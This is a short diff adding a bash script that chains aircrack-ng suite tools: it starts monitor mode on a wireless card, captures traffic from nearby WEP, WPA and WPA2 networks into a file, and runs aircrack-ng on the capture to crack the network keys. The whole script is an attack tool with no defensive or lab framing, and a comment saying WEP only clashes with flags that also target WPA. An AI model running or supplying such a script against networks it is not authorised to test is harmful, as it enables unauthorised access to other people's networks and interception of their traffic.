@@ -1,0 +1,10 @@
+#!/bin/bash
+
+# Step 1: start monitor
+airmon-ng start wlan0
+
+# Step 2: dump data for all WEP networks
+airodump-ng -t wep -t wpa -t wpa2 -w wep -i mon0
+
+# Step 3: try crack the data
+aircrack-ng wep-01.cap
